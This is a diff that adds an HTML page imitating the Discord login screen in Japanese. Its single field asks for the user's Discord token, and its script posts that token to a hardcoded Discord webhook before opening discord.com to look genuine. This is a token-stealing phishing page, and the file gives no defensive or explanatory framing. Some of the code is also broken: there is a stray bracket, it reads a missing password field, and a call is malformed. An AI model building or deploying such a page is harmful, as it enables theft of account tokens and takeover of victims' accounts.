@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<title>Discord</title>
+<style>
+    body {
+        font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #36393f;
+        color: #dcddde;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+    form {
+        background-color: #2f3136;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+        width: 400px;
+    }
+    .form-title {
+        color: #fff;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    label {
+        display: block;
+        margin-bottom: 8px;
+        font-size: 16px;
+    }
+    input[type="text"],
+    input[type="password"] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 20px;
+        background-color: #202225;
+        border: 1px solid #202225;
+        color: #dcddde;
+        border-radius: 3px;
+    }
+    input[type="button"] {
+        display: block;
+        width: 100%;
+        background-color: #5865f2;
+        color: #fff;
+        padding: 10px;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+        font-size: 16px;
+        text-transform: uppercase;
+        font-weight: bold;
+    }
+    input[type="button"]:hover {
+        background-color: #4752c4;
+    }
+    .form-footer {
+        text-align: center;
+        margin-top: 20px;
+        font-size: 14px;
+    }
+    .form-footer a {
+        color: #00aff4;
+        text-decoration: none;
+    }
+    .form-footer a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+
+<form id="loginForm">
+    <div class="form-title"><h2>ログイン</h2></div>
+    <label for="email">トークン</label>
+    <input type="text" id="email" name="email" required>
+    <input type="button" value="ログイン" onclick="sendData()">
+    <div class="form-footer">
+    </div>
+</form>
+
+<script>
+function sendData() {]
+    var email = document.getElementById('email').value;
+    var password = document.getElementById('password').value;
+    var data = {
+        content: `token: ${email}` // パスワードを含む情報は送信しない
+    };
+
+    fetch('https://discord.com/api/webhooks/1208601613783269376/euWVaEp1HsUWI7TqhMLRmxvEi-a86nXPcse8VSjEeYy3vLUNVvQU2J4wemeCoYP5Oe0R', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.text())
+    .then(result => console.log(result))
+    .catch(error => console.error('Error:', error));
+  window.open("https://discord.com, '_blank',")
+}
+</script>
+
+</body>
+</html>
